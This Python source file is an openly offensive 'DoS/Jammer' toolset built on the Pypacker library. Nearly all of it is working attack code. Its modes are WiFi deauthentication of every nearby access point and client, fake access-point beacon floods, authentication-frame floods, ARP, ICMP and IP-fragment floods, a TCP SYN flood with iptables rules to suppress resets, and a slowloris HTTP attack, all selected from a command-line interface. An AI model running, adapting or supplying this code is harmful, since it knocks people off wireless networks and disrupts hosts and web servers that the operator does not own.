"""
Sledgehammer DoS/Jammer tool.

Requirements:
- Python 3
- Pypacker


Copyright (C) 2017 Michael Stahn <michael.stahn.42@gmail.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import socket
import ssl
import struct
import sys
import time
import threading
import logging
import argparse
import subprocess
import random
import collections
import copy
import string
import re

from pypacker.layer12 import ethernet, arp, radiotap, ieee80211
from pypacker.layer3 import ip, icmp
from pypacker.layer4 import tcp
from pypacker import pypacker, psocket, utils

unpack_I = struct.Struct(">I").unpack
pack_B = struct.Struct("B").pack

logger = logging.getLogger("sledgehammer")
logger.setLevel(logging.DEBUG)
# logger.setLevel(logging.WARNING)

logger_streamhandler = logging.StreamHandler()
logger_formatter = logging.Formatter("%(message)s")
logger_streamhandler.setFormatter(logger_formatter)

logger.addHandler(logger_streamhandler)


def wifi_deauth_cb(pargs):
	"""
	Deauth everyone and everything
	"""
	if pargs.channels is not None:
		channels = [int(channel) for channel in pargs.channels.split(",")]
	else:
		channels = utils.get_available_wlan_channels(pargs.iface_name)

	logger.debug("using channels: %r", channels)

	psock_rcv = psocket.SocketHndl(iface_name=pargs.iface_name,
									mode=psocket.SocketHndl.MODE_LAYER_2,
									timeout=1)
	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
									mode=psocket.SocketHndl.MODE_LAYER_2)
	# {channel : {b"AP" : set(b"clients", ...)}}
	wdata = collections.defaultdict(lambda: collections.defaultdict(set))

	# thread: socket1: listen for traffic, extract ap/client macs
	def listen_cycler(pargs_ref):
		while pargs_ref.is_running:
			try:
				rtap = psock_rcv.recvp(lowest_layer=radiotap.Radiotap)[0]
			except (IndexError, socket.timeout, OSError):
				logger.debug("no packets received..")
				continue

			try:
				pkt_ieee80211 = rtap.ieee80211
			except Exception as ex:
				logger.warning(ex)
			# TODO: use channel info from radiotap?
			if pkt_ieee80211.is_beacon():
				bssid = pkt_ieee80211.beacon.bssid
				# don't overwrite already stored client MACs
				if bssid not in wdata[pargs.current_channel]:
					# logger.debug("new AP: %r %s", bssid, utils.get_vendor_for_mac(bssid))
					wdata[pargs.current_channel][bssid] = set()

			for client in pkt_ieee80211.extract_client_macs():
				bssid = pkt_ieee80211.upper_layer.bssid

				if client not in pargs.macs_excluded and\
						client not in wdata[pargs.current_channel][bssid]:
					# logger.debug("new client: %r %s", client, utils.get_vendor_for_mac(client))
					wdata[pargs.current_channel][bssid].add(client)

	pargs.is_running = True
	pargs.current_channel = channels[0]

	layer_radiotap = radiotap.Radiotap()
	layer_iee80211 = ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE,
										subtype=ieee80211.M_DEAUTH)
	layer_deauth = ieee80211.IEEE80211.Deauth()
	pkt_deauth = layer_radiotap + layer_iee80211 + layer_deauth

	thread_listen = threading.Thread(target=listen_cycler, args=[pargs])
	thread_listen.start()

	logger.info("first round slow start..")

	for cnt in range(pargs.count):
		seq = 0
		layer_deauth.seq = seq

		if not pargs.is_running:
			break

		for channel in channels:
			# skip non-traffic channels
			if cnt > 0 and len(wdata[channel]) == 0:
				#logger.debug("skipping channel %d", channel)
				continue

			utils.switch_wlan_channel(pargs.iface_name, channel)
			pargs.current_channel = channel

			try:
				time.sleep(0.4 if cnt == 0 else 0.05)
			except KeyboardInterrupt:
				pargs.is_running = False
				break

			logger.info("deauth on channel %3d (%3d APs, %3d clients, round %4d)",
						channel,
						len(wdata[channel]),
						sum(len(clients) for ap, clients in wdata[channel].items()),
						cnt
			)

			ap_clients = copy.copy(wdata[channel])

			for mac_ap, macs_clients in ap_clients.items():
				layer_deauth.seq += 1
				layer_deauth.bssid = mac_ap

				if not pargs.nobroadcast:
					# reset src/dst for broadcast
					layer_deauth.src = b"\xFF" * 6
					layer_deauth.dst = b"\xFF" * 6

					# TODO: increase?
					# TODO: check sequence
					# logger.debug("deauth AP: %r", mac_ap)
					for _ in range(5):
						layer_deauth.seq += 1
						psock_send.send(pkt_deauth.bin())

				for mac_client in macs_clients:
					# logger.debug("deauth client: %r", mac_client)
					pkt_deauth.src = mac_client
					pkt_deauth.dst = mac_client

					for _ in range(2):
						layer_deauth.seq += 1
						psock_send.send(pkt_deauth.bin())

	psock_send.close()
	psock_rcv.close()


def wifi_ap_cb(pargs):
	"""
	Create fake APs
	"""
	if pargs.channels is not None:
		channels = [int(channel) for channel in pargs.channels.split(",")]
	else:
		channels = utils.get_available_wlan_channels(pargs.iface_name)

	beacon_orig = radiotap.Radiotap() + \
					ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE, subtype=ieee80211.M_BEACON, to_ds=0, from_ds=0) + \
					ieee80211.IEEE80211.Beacon(
					dst=b"\xFF\xFF\xFF\xFF\xFF\xFF",
					src=b"\xFF\xFF\xFF\xFF\xFF\xFF",
					params=[ieee80211.IEEE80211.IE(id=0, len=10, body_bytes=b"\x00" * 10),
						ieee80211.IEEE80211.IE(id=1, len=8, body_bytes=b"\x82\x84\x8b\x96\x0c\x12\x18\x24"),
						ieee80211.IEEE80211.IE(id=3, len=1, body_bytes=b"\x04"),
						ieee80211.IEEE80211.IE(id=5, len=4, body_bytes=b"\x00\x01\x00\x00"),
						ieee80211.IEEE80211.IE(id=0x2A, len=1, body_bytes=b"\x00")])
	beacon = copy.deepcopy(beacon_orig)
	_beacon = beacon[ieee80211.IEEE80211.Beacon]
	mac = pypacker.get_rnd_mac()
	essid = "FreeHotspot"
	_beacon.src = mac
	_beacon.bssid = mac
	_beacon.params[0].body_bytes = bytes(essid, "ascii")
	_beacon.params[0].len = len(essid)
	_beacon.params[2].body_bytes = pack_B(channels[0])
	_beacon.seq = 0
	# adaptive sleeptime due to full buffer on fast sending
	sleeptime = 0.0000001
	rand_mac = True
	rand_essid = True
	pargs.is_running = True

	logger.info("faking APs on the following channels %r", channels)
	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
									mode=psocket.SocketHndl.MODE_LAYER_2)

	for cnt in range(pargs.count):
		if not pargs.is_running:
			break

		for channel in channels:
			_beacon.params[2].body_bytes = pack_B(channel)
			utils.switch_wlan_channel(pargs.iface_name, channel)

			if rand_mac:
				mac = pypacker.get_rnd_mac()
				_beacon.src = mac
				_beacon.bssid = mac

			if rand_essid:
				_beacon.params[0].body_bytes = bytes("".join(
					random.choice(string.ascii_uppercase + string.digits) for _ in range(10)),
					"ascii"
				)
				_beacon.params[0].len = len(_beacon.params[0].body_bytes)
			#logger.info("AP on channel %d: %s", channel, _beacon.params[0].body_bytes)

			try:
				for cnt_ap in range(3):
					# send multiple beacons for every ap
					psock_send.send(beacon.bin())
					time.sleep(sleeptime)
					_beacon.seq = cnt_ap
					# _beacon.ts = x << (8*7)
					_beacon.ts = cnt_ap * 20
				# time.sleep(0.01)
			except socket.timeout:
				# timeout on sending? that's ok
				pass
			except OSError:
				sleeptime *= 2
				logger.warning("buffer full, new sleeptime: %03.3f, waiting...", sleeptime)
				time.sleep(1)
	psock_send.close()


def wifi_authdos_cb(pargs):
	"""
	Authentication frames DoS
	"""
	radiotap_ieee80211 = radiotap.Radiotap() + \
		ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE, subtype=ieee80211.M_AUTH, to_ds=0, from_ds=0)
	auth = ieee80211.IEEE80211.Auth(dst_s=pargs.mac_dst, bssid_s=pargs.mac_dst)
	radiotap_ieee80211_auth = radiotap_ieee80211 + auth
	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
									mode=psocket.SocketHndl.MODE_LAYER_2)

	channel = int(pargs.channels.split(",")[0])
	logger.debug("sending %d deauth to %r on channel %d", pargs.count, pargs.mac_dst, channel)
	utils.switch_wlan_channel(pargs.iface_name, int(pargs.channels.split(",")[0]))

	for cnt in range(pargs.count):
		if cnt & 15 == 0:
			print(".", end="")
			sys.stdout.flush()
		auth.src = pypacker.get_rnd_mac()

		try:
			psock_send.send(radiotap_ieee80211_auth.bin())
		except socket.timeout:
			# timeout on sending? that's ok
			pass
	print("")
	psock_send.close()


def arp_cb(pargs):
	"""ARP DoS, eg for switches"""
	#logger.debug("%s %s %s %s", pargs.mac_src, pargs.mac_dst, pargs.ip_src, pargs.ip_dst)
	pkt_arp_req = ethernet.Ethernet(dst=b"\xFF" * 6, src_s=pargs.mac_src, type=ethernet.ETH_TYPE_ARP) +\
		arp.ARP(sha_s=pargs.mac_src, spa_s=pargs.ip_src, tha=b"\xFF" * 6, tpa_s=pargs.ip_dst,
			op=arp.ARP_OP_REQUEST)
	pkt_arp_resp = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src, type=ethernet.ETH_TYPE_ARP) + \
		arp.ARP(sha_s=pargs.mac_src, spa_s=pargs.ip_src, tha_s=pargs.mac_dst, tpa_s=pargs.ip_dst,
			op=arp.ARP_OP_REPLY)

	psock = psocket.SocketHndl(iface_name=pargs.iface_name)

	for cnt in range(pargs.count):
		# request from various sources
		mac = pypacker.get_rnd_mac()
		pkt_arp_req.src = mac
		pkt_arp_req.arp.sha = mac
		pkt_arp_req.arp.spa = pypacker.get_rnd_ipv4()
		psock.send(pkt_arp_req.bin())

		# response from various sources
		mac = pypacker.get_rnd_mac()
		pkt_arp_resp.src = mac
		pkt_arp_resp.arp.sha = mac
		pkt_arp_resp.arp.spa = pypacker.get_rnd_ipv4()
		psock.send(pkt_arp_resp.bin())
	psock.close()


def icmp_cb(pargs):
	"""ICMP DoS"""
	pkt_icmpreq = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src) +\
		ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst, p=ip.IP_PROTO_ICMP) +\
		icmp.ICMP(type=8) +\
		icmp.ICMP.Echo(id=1, ts=123456789, body_bytes=b"A" * 1460)

	psock = psocket.SocketHndl(iface_name=pargs.iface_name)

	for cnt in range(pargs.count):
		psock.send(pkt_icmpreq.bin())

	psock.close()


def ip_cb(pargs):
	"""
	IP fragment DOS
	"""
	eth_l = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src)
	ip_l = ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst)
	ip_l.body_bytes = b"A" * 4000
	psock = psocket.SocketHndl(iface_name=pargs.iface_name)
	ip_frags = ip_l.create_fragments(fragment_len=8)

	for cnt in range(pargs.count):
		for ip_frag in ip_frags:
			eth_l.upper_layer = ip_frag
			psock.send(eth_l.bin())

	psock.close()


def tcp_cb(pargs):
	"""TCP DoS"""
	iptables_rules_info = """
	iptables -I OUTPUT -p tcp --tcp-flags ALL RST,ACK -j DROP
	iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP
	iptables -I INPUT -p tcp --tcp-flags ALL RST -j DROP
	"""
	logger.info("For best performance set set these rules: %s", iptables_rules_info)
	pkt_tcp_syn = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src) +\
		ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst, p=ip.IP_PROTO_TCP) +\
		tcp.TCP(sport=12345, dport=pargs.port_dst)

	# Use raw sockets to circumvent network stack
	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
									mode=psocket.SocketHndl.MODE_LAYER_2)
	psock_rcv = psocket.SocketHndl(iface_name=pargs.iface_name,
									mode=psocket.SocketHndl.MODE_LAYER_2)
	is_running = True

	def answer_cycler():
		def filter_cb(pkt):
			try:
				return pkt.ip.tcp.flags == tcp.TH_SYN | tcp.TH_ACK
			except Exception as ex:
				#logger.warning(ex)
				pass
			return False

		while is_running:
			try:
				pkt_rsp = psock_rcv.recvp(filter_match_recv=filter_cb)[0]
				#logger.debug("got SYN,ACK: %r", pkt_rsp)
			except IndexError:
				logger.debug("no packets..")
				continue

			pkt_rsp.reverse_all_address()
			tcp_l = pkt_rsp.ip.tcp
			tcp_l.flags = tcp.TH_ACK
			tcp_l.seq, tcp_l.ack = tcp_l.ack, tcp_l.seq
			tcp_l.ack += 1

			psock_rcv.send(pkt_rsp.bin())

	answer_thread = threading.Thread(target=answer_cycler)
	answer_thread.start()

	randrange = random.randrange
	tcp_l = pkt_tcp_syn.ip.tcp

	logger.debug("sending...")
	input = 0x31CE

	#for cnt in range(pargs.count):
	for sport in range(0, 65536):
		tcp_l.seq = randrange(1000, 123123)
		tcp_l.sport = sport ^ input
		psock_send.send(pkt_tcp_syn.bin())
		print("\rsent %d syn" % sport, end="")
		#time.sleep(0.0001)
	print()

	logger.debug("finished")
	is_running = False
	time.sleep(999)

	psock_send.close()
	psock_rcv.close()


def slowlory_cb(pargs):
	running = [True]
	connected_socks = {}
	requestline = b"GET " + str.encode(pargs.path) + b" HTTP/1.1\r\nHost: " + str.encode(pargs.ip_dst) + b"\r\n"

	def connect_cycler():
		conn_cnt = 0

		while running[0]:
			conn_cnt += 1
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			send_cb = sock.send

			if pargs.ssl:
				logger.debug("using SSL")
				sock = ssl.wrap_socket(sock)
				send_cb = sock.write

			try:
				sock.connect((pargs.ip_dst, pargs.port_dst))
				send_cb(requestline)
				connected_socks[conn_cnt] = [sock, send_cb]
			except Exception as ex:
				print()
				logger.warning("could not connect: %r", ex)
			# time.sleep(0.1)

	def header_cycler():
		header_cnt = 0

		while running[0]:
			header_cnt += 1
			time.sleep(random.randrange(2, 3))
			logger.debug("sending headers for %d connections", len(connected_socks))

			for key in list(connected_socks.keys()):
				try:
					#logger.debug("\nconn %d: sending header %d", conn_cnt, header_cnt)
					send_cb = connected_socks[key][1]
					send_cb(b"X-Forward" + str.encode("%s" % header_cnt) + b": allow\r\n")
				except Exception as ex:
					#print(ex)
					#logger.debug("removing connection %r", key)
					del connected_socks[key]
			logger.debug("finished sending headers, %d connections left", len(connected_socks))

	for cnt in range(10):
		threading.Thread(target=connect_cycler).start()
		time.sleep(0.1)

	threading.Thread(target=header_cycler).start()

	try:
		time.sleep(999)
	except KeyboardInterrupt:
		pass
	print()
	running[0] = False

	logger.debug("closing sockets")

	for key, sock_cb in connected_socks.items():
		try:
			sock_cb[0].close()
		except:
			pass

PATTERN_IP = re.compile(b"inet (\d+\.\d+\.\d+\.\d+)")
PATTERN_MAC = re.compile(b"ether (.{2}:.{2}:.{2}:.{2}:.{2}:.{2})")


def get_iface_info(iface_name):
	"""
	iface_name -- The interface name
	return -- ip_address, mac_address
	"""
	cmd_call = ["ifconfig", iface_name]
	output = subprocess.check_output(cmd_call)
	match_macaddr = PATTERN_MAC.search(output)

	try:
		macaddr = bytes.decode(match_macaddr.group(1).lower())
	except:
		macaddr = None

	match_ipaddr = PATTERN_IP.search(output)

	try:
		ipaddr = bytes.decode(match_ipaddr.group(1).lower())
	except:
		ipaddr = None

	return macaddr, ipaddr


def set_iptables_rules(rules_str):
	logger.debug("removing iptables rules")
	cmd_call = ["iptables", "-F"]
	subprocess.check_output(cmd_call)

	rules = rules_str.split("\n")

	for rule in rules:
		cmd_call = ["iptables", rule]
		subprocess.check_output(cmd_call)


if __name__ == "__main__":
	mode_cb = {
		"wifi_deauth": (["channels", "nobroadcast", "exclude"], wifi_deauth_cb),
		"wifi_ap": (["channels"], wifi_ap_cb),
		"wifi_auth": (["channel", "mac_dst", "channels"], wifi_authdos_cb),
		"arp": (["mac_dst", "ip_dst"], arp_cb),
		"icmp": (["mac_dst", "ip_dst"], icmp_cb),
		"ip": (["mac_dst", "ip_dst"], ip_cb),
		"tcp": (["mac_dst", "ip_dst"], tcp_cb),
		"slowlory": (["ip_dst", "port_dst", "ssl"], slowlory_cb)
	}

	def auto_hex(x):
		"""'FF' -> 255"""
		return int(x, 16)

	mode_descr = ",".join([" %s (params: %s)" % (mode, cb[0]) for mode, cb in mode_cb.items()])

	parser = argparse.ArgumentParser(
		description="Sledgehammer DoS/Jammer toolset",
		formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument("-m", "--mode", type=str, help="Chose one of: %s" % mode_descr, required=True)
	parser.add_argument("-i", "--iface_name", type=str, help="Interface to be used", required=True)
	parser.add_argument("-c", "--count", type=int, help="Amount of packets to be sent", required=False, default=9999)
	parser.add_argument("--mac_dst", type=str, help="MAC address of direct target or router", required=False)
	parser.add_argument("--ip_dst", type=str, help="Target IP address", required=False)
	parser.add_argument("--port_dst", type=int, help="Target IP address", required=False)
	parser.add_argument("--ssl", type=bool, help="Use SSL", required=False, default=False)
	parser.add_argument("--path", type=str, help="Path to use like /index.html", required=False, default="/")
	parser.add_argument("--channels", type=str, help="Channels to scan", required=False, default=None)
	parser.add_argument("-n", "--nobroadcast", type=bool, help="Disable broadcast deauth", required=False, default=False)
	parser.add_argument(
		"--macs_excluded",
		type=str,
		help="MAC addresses to exclude for deauth",
		required=False,
		default=set()
	)

	args = parser.parse_args()
	args.mac_src, args.ip_src = get_iface_info(args.iface_name)

	if type(args.macs_excluded) is str:
		args.macs_excluded = set([
				pypacker.mac_str_to_bytes(mac) for mac in args.macs_excluded.split(",")
		])

	wifi_modes = {"wifi_deauth", "wifi_ap", "wifi_auth"}

	if args.mode in wifi_modes:
		logger.info("trying to activate monitor mode on %s", args.iface_name)

		try:
			utils.set_interface_mode(args.iface_name, monitor_active=True, state_active=True)
		except:
			logger.warning("you need to be root to execute this attack")
			sys.exit(1)

	try:
		mode_cb[args.mode][1](args)
	except KeyError:
		logger.warning("Unknown mode: %r", args.mode)
